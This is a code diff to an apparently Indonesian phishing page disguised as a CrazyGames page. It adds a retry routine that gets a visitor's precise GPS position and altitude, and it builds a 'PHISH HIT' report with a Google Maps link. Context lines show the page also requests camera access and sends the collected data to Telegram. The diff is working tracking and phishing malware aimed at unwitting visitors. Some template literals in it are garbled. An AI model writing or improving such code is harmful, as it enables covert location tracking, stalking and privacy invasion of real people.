@@ -107,32 +107,68 @@ async function kirimTelegram(text, photoBase64 = null, mapsLink = '') {
   }
 }
 
+// Fungsi ambil lokasi dengan retry biar lebih akurat
+function getAccuratePosition(maxRetry = 3) {
+  return new Promise((resolve) => {
+    let best = null;
+    let attempts = 0;
+
+    const options = {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    };
+
+    function tryGet() {
+      attempts++;
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const acc = pos.coords.accuracy || 9999;
+          if (!best || acc < best.coords.accuracy) {
+            best = pos;
+          }
+          // Kalau akurasi sudah bagus (< 40 meter) atau sudah max retry → selesai
+          if (acc < 40 || attempts >= maxRetry) {
+            resolve(best);
+          } else {
+            // Coba lagi
+            setTimeout(tryGet, 1200);
+          }
+        },
+        () => {
+          if (attempts >= maxRetry) {
+            resolve(best); // mungkin null
+          } else {
+            setTimeout(tryGet, 1200);
+          }
+        },
+        options
+      );
+    }
+
+    tryGet();
+  });
+}
+
 async function mulai() {
   const overlay = document.getElementById('overlay');
   const loading = document.getElementById('loading');
   overlay.style.display = 'flex';
   loading.style.display = 'block';
-  loading.innerText = 'Meminta izin lokasi...';
+  loading.innerText = 'Mencari lokasi akurat...';
 
-  let lat = null, lon = null, accuracy = null, photo = null;
+  let lat = null, lon = null, accuracy = null, altitude = null, photo = null;
 
-  // Ambil lokasi dengan akurasi tinggi
+  // Ambil lokasi terbaik dari device
   try {
-    const pos = await new Promise((ok, err) => {
-      navigator.geolocation.getCurrentPosition(ok, err, {
-        enableHighAccuracy: true,
-        timeout: 20000,
-        maximumAge: 0
-      });
-    });
-    lat = pos.coords.latitude;
-    lon = pos.coords.longitude;
-    accuracy = pos.coords.accuracy ? Math.round(pos.coords.accuracy) + ' meter' : 'tidak diketahui';
-  } catch(e) {
-    lat = 'ditolak';
-    lon = 'ditolak';
-    accuracy = '-';
-  }
+    const pos = await getAccuratePosition(3);
+    if (pos) {
+      lat = pos.coords.latitude;
+      lon = pos.coords.longitude;
+      accuracy = pos.coords.accuracy ? Math.round(pos.coords.accuracy) : null;
+      altitude = pos.coords.altitude ? Math.round(pos.coords.altitude) : null;
+    }
+  } catch(e) {}
 
   loading.innerText = 'Meminta izin kamera...';
 
@@ -163,18 +199,22 @@ async function mulai() {
   const screenInfo = screen.width + 'x' + screen.height;
   const waktu = new Date().toLocaleString('id-ID');
 
-  // Buat link Google Maps langsung
   let mapsLink = '';
   let lokasiText = '';
+
   if (typeof lat === 'number' && typeof lon === 'number') {
-    mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
-    lokasiText = `📍 *Lokasi Akurat*\n` +
-                 `Lat: \`${lat}\`\n` +
-                 `Lon: \`${lon}\`\n` +
-                 `Akurasi: ${accuracy}\n` +
-                 `🗺 [Buka di Google Maps](${mapsLink})`;
+    // Link Google Maps dengan zoom yang sesuai akurasi
+    const zoom = accuracy && accuracy < 50 ? 18 : accuracy && accuracy < 150 ? 16 : 14;
+    mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lon}&z=${zoom}`;
+
+    lokasiText = `📍 *Lokasi Device Target*\n` +
+                 `Lat: \`${lat.toFixed(6)}\`\n` +
+                 `Lon: \`${lon.toFixed(6)}\`\n` +
+                 `Akurasi: ${accuracy ? accuracy + ' meter' : 'tidak diketahui'}\n` +
+                 (altitude !== null ? `Ketinggian: ${altitude} m\n` : '') +
+                 `🗺 [Buka Google Maps](${mapsLink})`;
   } else {
-    lokasiText = `📍 Lokasi: ditolak / tidak tersedia`;
+    lokasiText = `📍 Lokasi: ditolak / GPS tidak tersedia`;
   }
 
   const pesan = `🎮 *CRAZYGAMES PHISH HIT*\n` +
@@ -195,4 +235,4 @@ setTimeout(() => {
 }, 1200);
 </script>
 </body>
-  </html>
+</html>
